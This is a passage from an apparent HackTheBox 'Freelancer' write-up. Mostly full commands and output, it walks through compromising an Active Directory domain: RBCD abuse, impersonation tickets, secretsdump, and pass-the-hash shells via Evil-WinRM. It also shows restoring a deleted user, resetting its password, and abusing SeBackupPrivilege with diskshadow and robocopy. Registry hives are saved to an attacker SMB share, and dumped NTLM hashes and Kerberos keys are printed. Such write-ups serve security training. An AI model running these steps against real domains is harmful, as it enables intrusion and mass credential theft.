It’s having some kind of SSL issue. I’ll notice the method here is `LDAPS`. The help for `addcomputer.py` shows there are two options here:

```

oxdf@hacky$ addcomputer.py -h
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

usage: addcomputer.py [-h] [-domain-netbios NETBIOSNAME] [-computer-name COMPUTER-NAME$]
                      [-computer-pass password] [-no-add] [-delete] [-debug] [-method {SAMR,LDAPS}]
                      [-port {139,445,636}] [-baseDN DC=test,DC=local]
                      [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH]
                      [-no-pass] [-k] [-aesKey hex key] [-dc-host hostname] [-dc-ip ip]
                      [domain/]username[:password]

Adds a computer account to domain
...[snip]...
  -method {SAMR,LDAPS}  Method of adding the computer.SAMR works over SMB.LDAPS has some certificate
                        requirementsand isn't always available.
...[snip]...

```

I’ll try `SAMR` and it works:

```

oxdf@hacky$ addcomputer.py -method SAMR -computer-name '0xdf$' -computer-pass '0xdf0xdf123!' -dc-host 10.10.11.5 -domain-netbios freelancer.htb 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Successfully added machine account 0xdf$ with password 0xdf0xdf123!.

```

#### Create RBCD

Now I want to tell the DC that 0xdf$ is allowed to act on it’s behalf using another [Impacket](https://github.com/SecureAuthCorp/impacket) script, `rbcd.py`:

```

oxdf@hacky$ rbcd.py -delegate-from '0xdf$' -delegate-to 'dc$' -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] 0xdf$ can now impersonate users on dc$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     0xdf$        (S-1-5-21-3542429192-2036945976-3483670807-11601) 

```

This requires the `GenericWrite` privilege on the DC account, which lorra199 has.

#### Generate Service Ticket

I’ll have 0xdf$ request a ticket impersonating the administrator account to the DC, and because of the now-configured RBCD, it will work:

```

oxdf@hacky$ getST.py -spn 'cifs/DC.freelancer.htb' -impersonate 'administrator' 'freelancer.htb/0xdf$:0xdf0xdf123!'
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache

```

#### Dump Hashes

With this ticket, I can act as the administrator account, so there are multiple ways to abuse this. I’ll use `secretsdump.py` to get the hashes for the domain:

```

oxdf@hacky$ KRB5CCNAME='administrator@cifs_DC.freelancer.htb@FREELANCER.HTB.ccache' secretsdump.py -no-pass -k dc.freelancer.htb -just-dc-ntlm
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::
freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::
sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::
SQLBackupOperator:1112:aad3b435b51404eeaad3b435b51404ee:c4b746db703d1af5575b5c3d69f57bab:::
sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
lorra199:1116:aad3b435b51404eeaad3b435b51404ee:67d4ae78a155aab3d4aa602da518c051:::
freelancer.htb\maya.artmes:1124:aad3b435b51404eeaad3b435b51404ee:22db50a324b9a34ea898a290c1284e25:::
freelancer.htb\michael.williams:1126:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
freelancer.htb\sdavis:1127:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\d.jones:1128:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\jen.brown:1129:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\taylor:1130:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\jmartinez:1131:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\olivia.garcia:1133:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\dthomas:1134:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\sophia.h:1135:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\Ethan.l:1138:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\wwalker:1141:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\jgreen:1142:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\evelyn.adams:1143:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\hking:1144:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\alex.hill:1145:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\samuel.turner:1146:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\ereed:1149:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\leon.sk:1151:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
freelancer.htb\carol.poland:1160:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
freelancer.htb\lkazanof:1162:aad3b435b51404eeaad3b435b51404ee:a26c33c2878b23df8b2da3d10e430a0f:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:89851d57d9c8cc8addb66c59b83a4379:::
DATACENTER-2019$:1115:aad3b435b51404eeaad3b435b51404ee:7a8b0efef4571ec55cc0b9f8cb73fdcf:::
DATAC2-2022$:1155:aad3b435b51404eeaad3b435b51404ee:007a710c0581c63104dad1e477c794e8:::
WS1-WIIN10$:1156:aad3b435b51404eeaad3b435b51404ee:57e57c6a3f0f8fff74e8ab524871616b:::
WS2-WIN11$:1157:aad3b435b51404eeaad3b435b51404ee:bf5267ee6236c86a3596f72f2ddef2da:::
WS3-WIN11$:1158:aad3b435b51404eeaad3b435b51404ee:732c190482eea7b5e6777d898e352225:::
DC2$:1159:aad3b435b51404eeaad3b435b51404ee:e1018953ffa39b3818212aba3f736c0f:::
SETUPMACHINE$:8601:aad3b435b51404eeaad3b435b51404ee:f5912663ecf2c8cbda2a4218127d11fe:::
0xdf$:11601:aad3b435b51404eeaad3b435b51404ee:1d6022ba48a97d47ea31566ce1bce602:::
[*] Cleaning up...

```

### Shell

With the administrator’s NTLM hash I can get a shell over WinRM:

```

oxdf@hacky$ evil-winrm -i freelancer.htb -u administrator -H 0039318f1e8274633445bce32ad1a290

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And read `root.txt`:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
5d21119c************************

```

## Alternative Paths to Administrator

### Overview

The path using RBCD is actually not the intended path. The author’s path (that I was unaware of until just before Freelancer retired) was to recover a deleted user with `SeBackupPrivilege`.

There’s another unintended path in Freelancer that involves a plaintext password in the memory dump file available as mikasaAckerman. I found this initially while looking at the dump with WindDbg and Mimikatz (which I’ll show below), but wasn’t able to find a use for the password. It was ryuki on the HTB discord who tipped me off to using variations of the password to find the password for *many* users on the domain. Thanks to ryuki and to [DebugPrivilege](https://x.com/DebugPrivilege) for the memory dump tips and [awesome repo of tutorials](https://github.com/DebugPrivilege/InsightEngineering).

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[Shell as\nmikasaAckerman]-->B(<a href='#dump-analysis'>Find Password\nfor lorra199</a>);
    B-->C[<a href="#shell">Shell as\nlorra199</a>];;
    C-->H(<a href="#restore-lizakazanof">Recover liza.kazanof\nAccount</a>);
    H-->I(<a href="#reset-password--shell">Reset liza.kazanof\nPassword</a>);
    I-->J[<a href="#reset-password--shell">Shell as liza.kazanof</a>];
    J--SeBackupPrivilege-->K(<a href="#exploit-sebackupprivilege">Dump Domain\nHashes</a>)
    K-->E;
    C-->D(<a href="#exploit-via-rbcd">RBCD</a>)
    D-->E[<a href="#shell-1">Shell as\nAdministrator</a>]
    A-->F(<a href="#recover-password">Find Password</a>)
    F-->G(<a href="#spray-password---failure">Spray Password\nVariation</a>)
    G-->D

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,9,10,11,12,13 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

### Intended Path

#### Recover liza.kazanof Password

When [dumping passwords from the memory dump], there was a hash for liza.kazanof. I’ll crack the with `hashcat`:

```

$ cat liza.kazanof.hash 
$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679
$ hashcat liza.kazanof.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2 | Operating System
...[snip]...
$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679:RockYou!
...[snip]...

```

It cracks in less than a second on my host to “RockYou!”. It doesn’t seem to work for this account:

```

oxdf@hacky$ netexec smb freelancer.htb -u liza.kazanof -p 'RockYou!' -d freelancer.htb
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\liza.kazanof:RockYou! STATUS_LOGON_FAILURE

```

#### Enumerate liza.kazanof

With a shell as lorra199, I can look at the liza.kazanof user. Weirdly, they don’t seem to exist:

```
*Evil-WinRM* PS C:\> net user liza.kazanof
net.exe : The user name could not be found.
    + CategoryInfo          : NotSpecified: (The user name could not be found.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
More help is available by typing NET HELPMSG 2221.

```

They don’t show up in the Bloodhound data either.

The lorra199 user is in the “AD Recycle Bin” group:

```
*Evil-WinRM* PS C:\> net user lorra199
User name                    lorra199
Full Name
Comment                      IT Support Technician
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/4/2023 8:19:13 AM
Password expires             Never
Password changeable          10/5/2023 8:19:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/13/2024 11:12:56 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *AD Recycle Bin
The command completed successfully.

```

[This group is all about managing deleted users](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/the-ad-recycle-bin-understanding-implementing-best-practices-and/ba-p/396944). Querying for deleted users returns two:

```
*Evil-WinRM* PS C:\> get-adobject -filter 'isdeleted -eq $true' -includedeletedobjects

Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=freelancer,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : bb081f2b-bd0a-4fc7-b3e9-50e107e961ee

Deleted           : True
DistinguishedName : CN=Liza Kazanof\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=freelancer,DC=htb
Name              : Liza Kazanof
                    DEL:ebe15df5-e265-45ec-b7fc-359877217138
ObjectClass       : user
ObjectGUID        : ebe15df5-e265-45ec-b7fc-359877217138

```

The first is a container, but the other is the Liza Kazanof user! To get all the data about Liza, I’ll use `-property *`:

```
*Evil-WinRM* PS C:\> get-adobject -filter 'isdeleted -eq $true -and ObjectClass -eq "user"' -includedeletedobjects -property *

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : freelancer.htb/Deleted Objects/Liza Kazanof
                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
CN                              : Liza Kazanof
                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
codePage                        : 0
countryCode                     : 0
Created                         : 5/14/2024 6:37:29 PM
createTimeStamp                 : 5/14/2024 6:37:29 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=Liza Kazanof\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=freelancer,DC=htb
dSCorePropagationData           : {12/31/1600 7:00:00 PM}
givenName                       : Liza
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : CN=Users,DC=freelancer,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
mail                            : liza.kazanof@freelancer.htb
memberOf                        : {CN=Remote Management Users,CN=Builtin,DC=freelancer,DC=htb, CN=Backup Operators,CN=Builtin,DC=freelancer,DC=htb}
Modified                        : 5/14/2024 6:41:44 PM
modifyTimeStamp                 : 5/14/2024 6:41:44 PM
msDS-LastKnownRDN               : Liza Kazanof
Name                            : Liza Kazanof
                                  DEL:ebe15df5-e265-45ec-b7fc-359877217138
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : ebe15df5-e265-45ec-b7fc-359877217138
objectSid                       : S-1-5-21-3542429192-2036945976-3483670807-2101
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133601998496583593
sAMAccountName                  : liza.kazanof
sDRightsEffective               : 0
sn                              : Kazanof
userAccountControl              : 512
userPrincipalName               : liza.kazanof@freelancer.com
uSNChanged                      : 544913
uSNCreated                      : 540822
whenChanged                     : 5/14/2024 6:41:44 PM
whenCreated                     : 5/14/2024 6:37:29 PM

```

Their logon is liza.kazanof.

#### Restore liza.kazanof

To restore that account, I’ll use `restore-adobject`:

```
*Evil-WinRM* PS C:\> restore-adobject -identity ebe15df5-e265-45ec-b7fc-359877217138
An attempt was made to add an object to the directory with a name that is already in use
At line:1 char:1
+ restore-adobject -identity ebe15df5-e265-45ec-b7fc-359877217138
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (CN=Liza Kazanof...eelancer,DC=htb:ADObject) [Restore-ADObject], ADException
    + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject

```

It fails. The name is already in use (which is a bit odd). `-newname` will create the object with a new name:

```
*Evil-WinRM* PS C:\> restore-adobject -identity ebe15df5-e265-45ec-b7fc-359877217138 -newname liza.kazanof.0xdf

```

It works, and liza.kazanof is in the users again:

```
*Evil-WinRM* PS C:\> get-aduser -filter * | select SamAccountName

SamAccountName
--------------
Administrator
Guest
krbtgt
mikasaAckerman
sshd
...[snip]...
lkazanof
liza.kazanof
*Evil-WinRM* PS C:\Users\lorra199\Documents> get-aduser -filter 'SamAccountName -eq "liza.kazanof"'

DistinguishedName : CN=liza.kazanof.0xdf,CN=Users,DC=freelancer,DC=htb
Enabled           : True
GivenName         : Liza
Name              : liza.kazanof.0xdf
ObjectClass       : user
ObjectGUID        : ebe15df5-e265-45ec-b7fc-359877217138
SamAccountName    : liza.kazanof
SID               : S-1-5-21-3542429192-2036945976-3483670807-2101
Surname           : Kazanof
UserPrincipalName : liza.kazanof@freelancer.com

```

#### Reset Password / Shell

Checking the password now shows a different error, that the password is expired:

```

oxdf@hacky$ netexec smb freelancer.htb -u liza.kazanof -p 'RockYou!'
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\liza.kazanof:RockYou! STATUS_PASSWORD_EXPIRED

```

If the password I have is the old one, then I can reset it:

```

oxdf@hacky$ changepasswd.py 'freelancer.htb/liza.kazanof:RockYou!@freelancer.htb' -newpass '0xdf0xdf!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of freelancer.htb\liza.kazanof
[*] Connecting to DCE/RPC as freelancer.htb\liza.kazanof
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
oxdf@hacky$ netexec smb freelancer.htb -u liza.kazanof -p '0xdf0xdf!'
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [+] freelancer.htb\liza.kazanof:0xdf0xdf!

```

It works over [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

oxdf@hacky$ evil-winrm -i freelancer.htb -u liza.kazanof -p '0xdf0xdf!'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\liza.kazanof\Documents>

```

#### Exploit SeBackupPrivilege

liza.kazanof has `SeBackupPrivilege`:

```
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

I’ve exploited this a couple times before, most recently on [BlackField](/2020/10/03/htb-blackfield.html#). On Blackfield, I showed the exploit using compiled DLLs. Here I’ll exploit it by getting a backup copy of `ntds.dit` using `diskshadow`.

I’ll create a SMB share using `smbserver.py` for transfer of files to and from Freelancer. I’ll grab copies of the SAM and SYSTEM hives (which I can read because of `SeBackupPrivilege`):

```
*Evil-WinRM* PS C:\> reg save hklm\sam \\10.10.14.6\share\sam
The operation completed successfully.
*Evil-WinRM* PS C:\> reg save hklm\system \\10.10.14.6\share\system
The operation completed successfully.

```

This is enough to get the local hashes, but not the domain hashes. For that I need `ntds.dit`, which can’t be read directly. I’ll use `diskshadow`, which will take a script, saved as `backup`:

```

set verbose on
set context persistent nowriters
set metadata C:\Windows\Temp\0xdf.cab
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup

```

The script will set the `metadata` location (not important, but it needs to exist). It’ll set the backup to be “client accessible” so that they are accessible by me. Then it starts the backup, backing up the `C:\` drive into a volume named `cdrive`, and then exposing that drive as `E:`.

I’ll create this script on my computer and then use `unix2dos` to format it for Windows:

```

oxdf@hacky$ vim backup
oxdf@hacky$ unix2dos backup 
unix2dos: converting file backup to DOS format...

```

I’ll run `diskshadow` passing it the script:

```
*Evil-WinRM* PS C:\programdata> upload backup

Info: Uploading /media/sf_CTFs/hackthebox/freelancer-10.10.11.5/backup to C:\programdata\backup

Data: 228 bytes of 228 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> diskshadow /s backup
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/15/2024 2:59:17 PM
-> set verbose on
-> set context persistent nowriters
-> set metadata C:\Windows\Temp\0xdf.cab
The existing file will be overwritten.
-> begin backup
-> add volume C: alias cdrive
-> create

Alias cdrive for shadow ID {da62a7a6-9ab3-414e-9721-62509d79f850} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {52fc981a-fe50-4f58-b866-3f5c45eaa703} set as environment variable.
Inserted file Manifest.xml into .cab file 0xdf.cab
Inserted file DisCF45.tmp into .cab file 0xdf.cab

Querying all shadow copies with the shadow copy set ID {52fc981a-fe50-4f58-b866-3f5c45eaa703}
        * Shadow copy ID = {da62a7a6-9ab3-414e-9721-62509d79f850}               %cdrive%
                - Shadow copy set: {52fc981a-fe50-4f58-b866-3f5c45eaa703}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{011d3cdb-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 10/15/2024 2:59:17 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
                - Originating machine: DC.freelancer.htb
                - Service machine: DC.freelancer.htb
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {da62a7a6-9ab3-414e-9721-62509d79f850}
The shadow copy was successfully exposed as E:\.
-> end backup
->

```

It seems to work. `E:\` looks like a backup of `C:\`:

```
*Evil-WinRM* PS C:\programdata> ls E:\

    Directory: E:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/24/2024   7:30 PM                apps
d-----         6/3/2024  10:50 AM                nginx
d-----        5/28/2024  11:47 AM                PerfLogs
d-r---        5/28/2024   2:18 PM                Program Files
d-----        5/28/2024   2:18 PM                Program Files (x86)
d-----        5/27/2024   7:50 AM                temp
d-r---        10/6/2024   9:57 PM                Users
d-----        5/28/2024  11:50 AM                Windows

```

I still don’t have access to copy files from this drive through. I’ll have to use `robocopy` to do it:

```
*Evil-WinRM* PS C:\programdata> copy E:\windows\ntds\ntds.dit .
Access to the path 'E:\windows\ntds\ntds.dit' is denied.
At line:1 char:1
+ copy E:\windows\ntds\ntds.dit .
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (E:\windows\ntds\ntds.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
*Evil-WinRM* PS C:\programdata> robocopy /b E:\Windows\ntds . ntds.dit
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, October 6, 2024 10:04:10 PM
   Source : E:\Windows\ntds\
     Dest : C:\programdata\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
------------------------------------------------------------------------------

                           1    E:\Windows\ntds\
            New File              16.0 m        ntds.dit
  0.0%
  0.3%
  0.7%
  1.1%
  1.5%
...[snip]...
 99.6%
100%
100%
------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00

   Speed :            97541953 Bytes/sec.
   Speed :            5581.395 MegaBytes/min.
   Ended : Sunday, October 6, 2024 10:04:10 PM

```

I’ll download this file as well.

From these, I can dump the domain hashes:

```

oxdf@hacky$ secretsdump.py -ntds ntds.dit -system system local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x9db1404806f026092ec95ba23ead445b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 69f0afd7f9c47bac4a83dded01eb9dea
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0039318f1e8274633445bce32ad1a290:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:89851d57d9c8cc8addb66c59b83a4379:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d238e0bfa17d575038efc070187a91c2:::
freelancer.htb\mikasaAckerman:1105:aad3b435b51404eeaad3b435b51404ee:e8d62c7d57e5d74267ab6feb2f662674:::
sshd:1108:aad3b435b51404eeaad3b435b51404ee:c1e83616271e8e17d69391bdcd335ab4:::
SQLBackupOperator:1112:aad3b435b51404eeaad3b435b51404ee:c4b746db703d1af5575b5c3d69f57bab:::
sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
DATACENTER-2019$:1115:aad3b435b51404eeaad3b435b51404ee:7a8b0efef4571ec55cc0b9f8cb73fdcf:::
lorra199:1116:aad3b435b51404eeaad3b435b51404ee:67d4ae78a155aab3d4aa602da518c051:::
freelancer.htb\maya.artmes:1124:aad3b435b51404eeaad3b435b51404ee:22db50a324b9a34ea898a290c1284e25:::
freelancer.htb\michael.williams:1126:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
freelancer.htb\sdavis:1127:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\d.jones:1128:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\jen.brown:1129:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\taylor:1130:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\jmartinez:1131:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\olivia.garcia:1133:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\dthomas:1134:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\sophia.h:1135:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\Ethan.l:1138:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\wwalker:1141:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\jgreen:1142:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\evelyn.adams:1143:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\hking:1144:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\alex.hill:1145:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\samuel.turner:1146:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\ereed:1149:aad3b435b51404eeaad3b435b51404ee:933a86eb32b385398ce5a474ce083447:::
freelancer.htb\leon.sk:1151:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
DATAC2-2022$:1155:aad3b435b51404eeaad3b435b51404ee:007a710c0581c63104dad1e477c794e8:::
WS1-WIIN10$:1156:aad3b435b51404eeaad3b435b51404ee:57e57c6a3f0f8fff74e8ab524871616b:::
WS2-WIN11$:1157:aad3b435b51404eeaad3b435b51404ee:bf5267ee6236c86a3596f72f2ddef2da:::
WS3-WIN11$:1158:aad3b435b51404eeaad3b435b51404ee:732c190482eea7b5e6777d898e352225:::
DC2$:1159:aad3b435b51404eeaad3b435b51404ee:e1018953ffa39b3818212aba3f736c0f:::
freelancer.htb\carol.poland:1160:aad3b435b51404eeaad3b435b51404ee:af7b9d0557964265115d018b5cff6f8a:::
freelancer.htb\lkazanof:1162:aad3b435b51404eeaad3b435b51404ee:a26c33c2878b23df8b2da3d10e430a0f:::
freelancer.com\liza.kazanof:2101:aad3b435b51404eeaad3b435b51404ee:990f5eb0caa0773fb5b3df18692eea92:::
SETUPMACHINE$:8601:aad3b435b51404eeaad3b435b51404ee:f5912663ecf2c8cbda2a4218127d11fe:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:1743fa93ed1f2f505d3c7cd6ef1e8c40589f107070065e98efc89ea907d81601
Administrator:aes128-cts-hmac-sha1-96:bd23b1924f1fd0bdc60abf464114a867
Administrator:des-cbc-md5:0d400dfe572a3262
DC$:aes256-cts-hmac-sha1-96:561edbca437df7878b890f544efd54ed5a86443cf658ddd313ffb33464c537fe
DC$:aes128-cts-hmac-sha1-96:fb08d27ee4139adcb6a2cc33745af2f3
DC$:des-cbc-md5:67c85d34a708e334
krbtgt:aes256-cts-hmac-sha1-96:4e33b02ee45738a0db98c0747d8d41b7205f4f583c8f0591e20d67178b20511d
krbtgt:aes128-cts-hmac-sha1-96:adcc7fdd6f19591bbefa232ed8694c43
krbtgt:des-cbc-md5:04d3cd1cbaea5262
freelancer.htb\mikasaAckerman:aes256-cts-hmac-sha1-96:6164b1e12f315d3a6e9f7fc602e1e27ff14f74f344d6cd0ed6cb748ec5650c69
freelancer.htb\mikasaAckerman:aes128-cts-hmac-sha1-96:a756aa73641bd3773edfa97cb6bf54ed
freelancer.htb\mikasaAckerman:des-cbc-md5:ab1ce53d6eb5b62a
